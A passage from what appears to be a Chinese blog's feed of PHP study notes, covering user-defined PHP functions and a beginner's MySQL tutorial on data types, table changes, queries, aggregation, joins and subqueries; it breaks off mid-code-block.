title="用户自定义函数"></a>用户自定义函数</h2><p>函数如何定义：要定义一个函数，在PHP里面要先加上function关键词<br>下面看一个伪代码（不能运行）函数的例子：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span><span class="comment">//这是一段伪代码，为了直观的介绍函数的简单定义而已。</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">lxj</span>(<span class="params">$var_1, $var_2, $var_3,<span class="comment">/*,,,,,,*/</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;伪代码\n&quot;</span>;</span><br><span class="line"><span class="keyword">return</span> ...;</span><br><span class="line">&#125;<span class="comment">//此代码不能运行</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>函数名称自己定义，但是也不是随便，命名规则：有效的函数名以字母或下划线打头，后面跟字母，数字或下划线。<br>任何有效的PHP代码都有可能出现在函数内部，甚至包含其他函数和类的定义。1.函数无需在调用之前被定义，除非是下面的函数是有条件的被定义。2.当一个函数是有条件被定义时，必须在调用函数之前定义。看个例子：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$makelizi = <span class="literal">true</span>;</span><br><span class="line">lizi();<span class="comment">//lizi函数还不能调用，因为它还不存在</span></span><br><span class="line">lxj();<span class="comment">//但是bar函数可以调用，因为bar函数不是有条件的函数。</span></span><br><span class="line"><span class="keyword">if</span>($makelizi)&#123;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">lizi</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;lalala\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//可以调用lizi函数了，因为$makelizi的值为真了。</span></span><br><span class="line"><span class="keyword">if</span>($makelizi) lizi();</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">lxj</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;xixixi\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这个代码是可以跑的，自己跑一下对比更明显，理解更清楚。<br>再来一个函数套函数的代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">lxj</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">wkx</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;nice,xiongdei\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//这里不能直接调用wkx函数，因为他还不存在。可以理解为没有被定义。</span></span><br><span class="line">lxj();</span><br><span class="line"><span class="comment">//现在就可以调用wkx函数了，因为lxj函数被执行了，使得wkx函数被定义。</span></span><br><span class="line">wkx();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>介绍都在代码中注释了。PHP中的所有函数都具有全局作用域，可以定义在一个函数之内而在函数外面调用。相反也可以。PHP不支持函数重载，也不可能取消定义或者重定义已经声明过的函数。<br>注意：函数名是大小与大小写无关的，不过尽量写成一样的，养成一个好习惯。<br>递归函数：<br>PHP中还可以调用递归函数，还是来个代码看看</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">lxj</span>(<span class="params">$f=<span class="number">1</span></span>)</span>&#123;</span><br><span class="line"><span class="keyword">if</span>($f &lt; <span class="number">20</span>)&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;lalala\n&quot;</span>;</span><br><span class="line">lxj($f+<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">lxj();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>递归函数的调用要注意的是避免调用超过100-200层，因为可能会堆栈崩溃从而使当前脚本终止。无限递归可视为编程错误。</p><h2 id="函数的参数"><a href="#函数的参数" class="headerlink" title="函数的参数"></a>函数的参数</h2><p>函数的参数可以不填，使其默认参数起作用，也可以传参。<br>先看个通过引用办法传参的代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">lxj</span>(<span class="params">&amp;$string</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">$string .= <span class="string">&quot;或者其他的&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">$str = <span class="string">&quot;这是一个字符串,&quot;</span>;</span><br><span class="line">lxj($str);</span><br><span class="line"><span class="keyword">echo</span> $str;<span class="comment">//输出结果：这是一个字符串,或者其他的[Finished in 0.1s]</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>或者直接传递参数，覆盖默认值</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">lxj</span>(<span class="params">$a=<span class="number">10</span>,$b=<span class="number">20</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">echo</span> $a+$b;</span><br><span class="line">&#125;</span><br><span class="line">lxj(<span class="number">20</span>,<span class="number">25</span>);</span><br><span class="line"><span class="comment">//运行结果：45[Finished in 0.1s]</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>先总结到这里，下次接着学习没学完的函数。</p>]]></content>
      
      
      
        <tags>
            
            <tag> PHP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP从零开始——学习笔记(4)</title>
      <link href="/2020/08/23/php%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E2%80%94%E2%80%94%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E5%9B%9B%EF%BC%89/"/>
      <url>/2020/08/23/php%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E2%80%94%E2%80%94%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E5%9B%9B%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<h1 id="mysql快速入门"><a href="#mysql快速入门" class="headerlink" title="mysql快速入门"></a>mysql快速入门</h1><h2 id="数据库基本概念"><a href="#数据库基本概念" class="headerlink" title="数据库基本概念"></a>数据库基本概念</h2><p>之前了解过一点点数据库的概念，所以到这里学习这一小节会比较轻松。</p><p>一、数据库的基本概念</p><p>​    <strong>数据库</strong>：信息存储的仓库，包括一系列的关系措施</p><p>​    <strong>表</strong>：一个数据库中可以有若干张表（形势上你可以看出我们日常生活中建立的表）</p><p>​    <strong>字段</strong>：表里面的信息会分成若干个栏目来存，这些栏目在数据库技术中的名称叫做“字段”，栏目里面存的具体信息叫字段值</p><p>​    <strong>记录</strong>：一条信息叫做一条记录</p><p>一个数据库管理系统中可以建立若干个数据库，每个数据库中又可以建立若干张表，每张表中可以有若干条记录。</p><h2 id="MySQL支持的数据类型"><a href="#MySQL支持的数据类型" class="headerlink" title="MySQL支持的数据类型"></a>MySQL支持的数据类型</h2><p>为了对不同性质的数据进行区分，以提高数据查询和操作的效率，数据库系统将可以存入的数据分为多种类型。MySQL数据库中的数据类型分为三大类：数值类型、日期类型、字符串类型。</p><p>1.<strong>数值类型</strong></p><p>在整数类型中，按照取值范围和存储方式不同，分为tinyint、smallint、mediumint、int和bigint这5个类型。</p><p>2.<strong>日期类型</strong></p><p>日期和时间类型</p><p>date、datetime、timestamp、time、year。</p><p>datetime是常用的日期类型。如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">create table j4y(dt datetime);</span><br><span class="line">insert into j4y values(now());</span><br></pre></td></tr></table></figure><p>3.<strong>字符串类型</strong></p><p>  字符串类型 描述</p><p>  <strong>CHAR</strong>(M)     M为0~255之间的整数,表示可以存M个字符</p><p>  <strong>VARCHAR</strong>(M)     M为0~65535之间的整数,表示可以存M个字符</p><p>  <strong>TINYTEXT</strong>    允许长度0~255字符</p><p>  <strong>TEXT</strong>     允许长度0~65535字符</p><p>  <strong>MEDIUMTEXT</strong>     允许长度0~167772150字符</p><p>  <strong>LONGTEXT</strong>     允许长度0~42949667295字符</p><p><strong>BINARY</strong>(M) 允许长度0~M个字节的定长字节字符串(类似于CHAR类型，但保存二进制字节字符串而不是非二进制字符串)</p><p>  <strong>VARBINARY</strong>(M) 允许长度0~M个字节的变长字节字符串类型类似于VARCHAR类型，但保存二进制字节字                   符串而不是非二进制字符串。</p><p>  <strong>TINYBLOB</strong> 允许长度0~255字节的BLOB列(保存二进制字节字符串)</p><p>  <strong>BLOB</strong> 允许长度0~65535字节的BLOB列(保存二进制字节字符串)</p><p>  <strong>MEDIUMBLOB</strong> 允许长度0~167772150字节的BLOB列(保存二进制字节字符串)</p><p>  <strong>LONGBLOB</strong>允许长度0~4294967295字节的BLOB列(保存二进制字节字符串)</p><p>  <strong>ENUM</strong> 枚举类型</p><p>  <strong>SET</strong> SET类型</p><p>  <strong>字符串类型详细说明：</strong>   </p><p>  1)char和varchar类型</p><p>​    char与varchar很类似，都用来保存MySQL中较短字符串。</p><p>​    区别：char列的长度固定位创建表时声明的长度，长度可以为0~255的任何值；</p><p>​                varchar列中的值为可变长字符串，长度可以指定为0<del>65535（MySQL5.0.3版本以前为0</del>255）之间的值。</p><p>​                在检索时，char列删除尾部的空格，而varchar则保留这些空格。</p><p>​    create table j4y(v varchar(4),c char(4));</p><p>​    insert into j4y values(‘ab ‘,’ab ‘);</p><p>​    select length(v),length(c) from t1;</p><p>​    select concat(v,’+’),concat(c,’+’) from vc;</p><p>​    选择：由于char是固定长度，所以它的处理速度比varchar快，但是缺点是浪费存储空间。所以对于那些长度变化不大的数据可以选择此列</p><p>  2)text类型</p><p>​    保存少量字符串的时候，我们会选择char或者varchar，保存大文本的时候通常会选择使用text。</p><p>  3)blob类型</p><p>​    blob类型也是用来保存比较大量的字符串的名单是blob类型是用来保存二进制数据的比如照片。</p><p>  2)ENUM类型</p><p>​    枚举类型，它的值范围需要在创建表时通过枚举方式显式指定，对1<del>255个成员的枚举需要1个字节存储；对于255</del>65535个成员，需要2个</p><p>​    字节存储。最多有65535个成员。</p><p>​    create table j4y(flag enum(‘a’,’b’,’c’,’d’));</p><p>​    insert into j4y values(‘a’),(‘a’),(‘f’);</p><p>​    往enum类型里存储数据是<strong>忽略大小写</strong>的，对于插入不在enum指定范围内的值时，并没有返回警告，而是插入了enum的第一个值。</p><p>​    另外enum类型只允许从值集合中选取单个值，而不能一次取多个值</p><p>  3)SET类型</p><p>​    set和enum类型非常类似，也是一个字符串对象，里面可以包含0~64个成员。根据成员的不同，存储上也有所不同。</p><p>​    1~8成员的集合，占1个字节</p><p>​    9~16成员的集合，占2个字节</p><p>​    17~24成员的集合，占3个字节</p><p>​    25~32成员的集合，占4个字节</p><p>​    33~64成员的集合，占8个字节</p><p>​    create table t1(flag set(‘a’,’b’,’c’,’d’));</p><p>​    insert into t1 values(‘a,b’),(‘a,d,a’);</p><p>​    SET类型可以从允许值集合中选择任意1个或多元素进行组合，所以对于输出的值只要在允许的组合范围内，都可以正确地注入到set类型的</p><p>​    列中。</p><p>​    对于超出允许值范围的值，将<strong>不允许注入</strong>，对于包含重复的成员的集合将<strong>只取一次进行注入</strong>。</p><p>​    使用FIND_IN_SET函数对set类型的数据进行查询是比较好的选择!</p><h2 id="MySQL使用入门"><a href="#MySQL使用入门" class="headerlink" title="MySQL使用入门"></a>MySQL使用入门</h2><h3 id="SQL分类"><a href="#SQL分类" class="headerlink" title="SQL分类"></a>SQL分类</h3><h4 id="DDL语句"><a href="#DDL语句" class="headerlink" title="DDL语句"></a>DDL语句</h4><p>操作之前首先登录mysql。</p><p><code>mysql -u 用户名 -p</code>回车然后输入密码登录。（有密码输密码，无密码直接回车）</p><p>1）DDL(Data Definition Languages)语句</p><p>​      数据定义语句，通过这类语言可以对数据库进行创建删除更改。</p><p>登录mysql，对数据库进行操作。</p><p>1&gt;<code>show databases;</code>查看所有数据库</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; show databases;</span><br><span class="line">+<span class="comment">--------------------+</span></span><br><span class="line">| Database           |</span><br><span class="line">+<span class="comment">--------------------+</span></span><br><span class="line">| information_schema |</span><br><span class="line">| challenges         |</span><br><span class="line">| dvwa               |</span><br><span class="line">| mysql              |</span><br><span class="line">| performance_schema |</span><br><span class="line">| security           |</span><br><span class="line">| test               |</span><br><span class="line">+<span class="comment">--------------------+</span></span><br></pre></td></tr></table></figure><p>2&gt;<code>create database 数据库名;</code>创建一个数据库（数据库名自定义）</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; create database lxj;</span><br><span class="line">Query OK, 1 row affected (0.00 sec)</span><br></pre></td></tr></table></figure><p>3&gt;<code>drop database 数据库名;</code>删除数据库</p><p>4&gt;创建表、字段。删除表、字段。等等这些基本操作就不在叙述，之前总结过了。只添加一些补充内容。</p><p>5&gt;查看表：<code>desc 表名</code></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; desc j4y;</span><br><span class="line">+<span class="comment">-------+---------+------+-----+---------+-------+</span></span><br><span class="line">| Field | Type    | Null | Key | Default | Extra |</span><br><span class="line">+<span class="comment">-------+---------+------+-----+---------+-------+</span></span><br><span class="line">| id1   | int(11) | YES  |     | NULL    |       |</span><br><span class="line">| id2   | int(11) | YES  |     | NULL    |       |</span><br><span class="line">+<span class="comment">-------+---------+------+-----+---------+-------+</span></span><br><span class="line">2 rows in <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure><p>第二种方式：<code>show create table 表名 \G</code>最后无分号。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; show create table j4y \G</span><br><span class="line">*************************** 1. row ***************************</span><br><span class="line">       Table: j4y</span><br><span class="line"><span class="keyword">Create</span> <span class="keyword">Table</span>: <span class="keyword">CREATE</span> <span class="keyword">TABLE</span> <span class="string">`j4y`</span> (</span><br><span class="line">  <span class="string">`id1`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">DEFAULT</span> <span class="literal">NULL</span>,</span><br><span class="line">  <span class="string">`id2`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">DEFAULT</span> <span class="literal">NULL</span></span><br><span class="line">) <span class="keyword">ENGINE</span>=MyISAM <span class="keyword">DEFAULT</span> <span class="keyword">CHARSET</span>=utf8</span><br><span class="line"><span class="number">1</span> <span class="keyword">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure><p>说明：<code>\G</code>选项使得记录能够按照字段竖向排列，以便更好地显示内容较长的记录。</p><p>6&gt; 修改表</p><p>1)修改表的字段类型</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">alter table 表名 modify [column] 字段定义 [first|after 字段名];</span><br></pre></td></tr></table></figure><p>举个栗子</p><p>2)增加表字段</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">alter table 表名 add [column] 字段定义 [first|after 字段名];</span><br></pre></td></tr></table></figure><p>3)删除表字段</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">alter table 表名 drop [column] 字段名;</span><br></pre></td></tr></table></figure><p>4)字段改名</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">alter table 表名 change [column] 旧的字段名 新字段定义 [first|after 字段名];</span><br></pre></td></tr></table></figure><p>举个例子：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; alter table j4y add column id3 int;</span><br><span class="line">Query OK, 0 rows affected (0.04 sec)</span><br><span class="line">Records: 0  Duplicates: 0  Warnings: 0</span><br><span class="line"></span><br><span class="line">mysql&gt; alter table j4y change column id2 Augenstern int;</span><br><span class="line">Query OK, 0 rows affected (0.01 sec)</span><br><span class="line">Records: 0  Duplicates: 0  Warnings: 0</span><br><span class="line"></span><br><span class="line">mysql&gt; desc j4y;</span><br><span class="line">+------------+------------+------+-----+---------+-------+</span><br><span class="line">| Field      | Type       | Null | Key | Default | Extra |</span><br><span class="line">+------------+------------+------+-----+---------+-------+</span><br><span class="line">| id1        | tinyint(4) | YES  |     | NULL    |       |</span><br><span class="line">| Augenstern | int(11)    | YES  |     | NULL    |       |</span><br><span class="line">| id3        | int(11)    | YES  |     | NULL    |       |</span><br><span class="line">+------------+------------+------+-----+---------+-------+</span><br><span class="line">3 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure><ol start="5"><li>修改字段排列顺序</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">alter table j4y modify id1 tinyint first;&#x2F;&#x2F;移动到第一位</span><br><span class="line">alter table j4y modify id3 int after id1;&#x2F;&#x2F;移动到指定位置后面</span><br></pre></td></tr></table></figure><p>6)更改表名</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">alter table 表名 rename [to] 新的表名;</span><br></pre></td></tr></table></figure><h4 id="DML语句"><a href="#DML语句" class="headerlink" title="DML语句"></a>DML语句</h4><p>DML操作是指对数据库中表记录的操作，主要包括表记录的插入、更新、删除、和查询。</p><ol><li>插入记录</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">insert into 表名(字段1,字段2,字段3,....,字段n) values(相对应的内容)</span><br></pre></td></tr></table></figure><p>栗子：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; insert into admin(id,lxj,j4y) values(01,456,789);</span><br><span class="line">Query OK, 1 row affected (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from admin;</span><br><span class="line">+------+------+------+</span><br><span class="line">| id   | lxj  | j4y  |</span><br><span class="line">+------+------+------+</span><br><span class="line">|    1 |  456 |  789 |</span><br><span class="line">+------+------+------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure><p>字段名可不写。</p><p>一次性插入多条记录，：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; insert into admin(id,lxj,j4y) values</span><br><span class="line">    -&gt; (2,564,446),</span><br><span class="line">    -&gt; (3,580,541),</span><br><span class="line">    -&gt; (4,965,315);</span><br><span class="line">Query OK, 3 rows affected (0.00 sec)</span><br><span class="line">Records: 3  Duplicates: 0  Warnings: 0</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from admin;</span><br><span class="line">+------+------+------+</span><br><span class="line">| id   | lxj  | j4y  |</span><br><span class="line">+------+------+------+</span><br><span class="line">|    1 |  456 |  789 |</span><br><span class="line">|    2 |  564 |  446 |</span><br><span class="line">|    3 |  580 |  541 |</span><br><span class="line">|    4 |  965 |  315 |</span><br><span class="line">+------+------+------+</span><br><span class="line">4 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure><ol start="2"><li>更新记录</li></ol><p>更新一个表</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">update 表名 set 字段1&#x3D;值1,字段2&#x3D;值2,....,字段n&#x3D;值n where [限制条件];</span><br></pre></td></tr></table></figure><p>更新多个表</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">update 表1,表2,...表n set 表1.字段1&#x3D;表达式1,表n.字段n&#x3D;表达式n [where 条件];</span><br></pre></td></tr></table></figure><ol start="3"><li>删除记录</li></ol><p>删除一个表中的数据</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">delete from 表名 [where 条件];</span><br></pre></td></tr></table></figure><p>输出多个表中的数据</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">delete 表1,表2,...表n from 表1,表2,...表n [where 条件];</span><br></pre></td></tr></table></figure><ol start="4"><li>查询记录</li></ol><p>一、查询不重复的记录</p><p>SELECT distinct field1,field2 FROM 表名;<br>只要field1,field2任何一个字段有不同就会被选择！<br>一般使用distinct,只筛选一个字段!</p><p>二、</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">=,&lt;,&gt;,&gt;=,&lt;=,!=等比较运算符</span><br><span class="line">多个条件之间可以使用or and等</span><br><span class="line">where 后面接条件</span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> 表名 <span class="keyword">where</span> 条件</span><br></pre></td></tr></table></figure><p>三、排序</p><p>asc:由低到高，也是默认值</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from 表名 order by 字段名 asc;</span><br></pre></td></tr></table></figure><p>如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from admin order by id asc;</span><br><span class="line">+------+------+------+</span><br><span class="line">| id   | lxj  | j4y  |</span><br><span class="line">+------+------+------+</span><br><span class="line">|    1 |  456 |  789 |</span><br><span class="line">|    2 |  564 |  446 |</span><br><span class="line">|    3 |  580 |  541 |</span><br><span class="line">|    4 |  965 |  315 |</span><br><span class="line">+------+------+------+</span><br><span class="line">4 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure><p>desc:由高到底</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from 表名 order by 字段名 desc;</span><br></pre></td></tr></table></figure><p>多个字段排序</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from 表名 order by 字段名1 desc,字段名2 desc;</span><br></pre></td></tr></table></figure><p>四、聚合</p><p>①sum求和<br><code>select sum(字段名) from 表名;</code><br>②count记录总数<br><code>select count(*|字段名) from 表名;</code><br>③max最大值<br><code>select max(字段名) from 表名;</code><br>④min最小值<br><code>select min(字段名) from 表名;</code><br>⑤GROUP BY分类聚合<br><code>select department,sum(salary) from employee group by department;</code><br>⑥WITH ROLLUP分类聚合后的结果进行再汇总<br><code>select sum(salary) from employee group by department with rollup;</code><br>⑦HAVING<br>注意：having和where的区别在于，having是对聚合后的结果进行条件过滤，而where是在聚合前就对记录进行过滤 ，应该尽可能的对记录进行先过滤！<br><code>select sum(salary) from employee group by department having sum(salary)&gt;1000;</code><br>在一起使用：<code>select sum(id),max(id),min(id),count(*) from a1;</code></p><p>五、表连接</p><p>需求：显示多个表中的字段的时候即可使用表连接</p><p>连接分类</p><p>内连接：选取两张表中相互匹配的记录</p><p><code>select 表.字段,....  from 表1名,表2名,...  where [匹配的条件比如 表1.字段=表2.字段];</code></p><p>外连接：不仅仅选取两张相互匹配的记录，并且会选出其他不匹配的记录</p><ul><li>左连接</li></ul><p>概念：包含左边表中的所有记录(包括右表中没有和它匹配的记录)</p><ul><li>右连接</li></ul><p>概念：包含右边表中的所有记录(包括左表中没有和它匹配的记录)<br>左连接和右连接是可以相互转换的！</p><p>六、子查询</p><p>需求：一个查询需要另外一个查询的结果参与的时候</p><p>用于子查询的关键字:</p><p>①：in</p><p>使用语法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from 表名1 where id in(select 字段名 from 表名2);</span><br></pre></td></tr></table></figure><p>in 在..里面<br>注意点 in后面的子语句必须只返回一个字段<br>若查询结果唯一(只有一条)可以使用=代替in</p><p>②：not in</p><p>与in相反</p><p>③：exists</p><p>使用语法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select语句 where exists(select 语句);</span><br></pre></td></tr></table></figure><p>exists：后面那个子语句有没有查询出记录来，如果查询出记录来返回true,否则就是false,并且查询出来的记录的具体的值是NULL也是没有关系,也是返回true.</p><p>④：not exists</p><p>与exists相反</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from 表名1 where 表名2 in(select 表名2 from 字段名);</span><br></pre></td></tr></table></figure><p>若查询结果唯一可以使用=代替in</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from 表明1 where 表名2&#x3D;(select 表名2 from 字段名 limit 1);</span><br></pre></td></tr></table></figure><p>七、记录联合</p><p>我们常常会碰到需要将两个表或者多个表的数据按照一定的查询条件查询出来后，将结果合并到一起显示这是就需要用到记录联合<br>多个select 语句用<br>UNION或者UNION ALL隔开即可实现<br>区别： 前者 会将多个查询结果合并后并且进行去除重复后返回<br>后者 则直接合并并不去除重复<br>联合的条件：查询的列个数要相等</p><h2 id="MySQL中的常用函数"><a href="#MySQL中的常用函数" class="headerlink" title="MySQL中的常用函数"></a>MySQL中的常用函数</h2><ol><li>字符串函数</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span 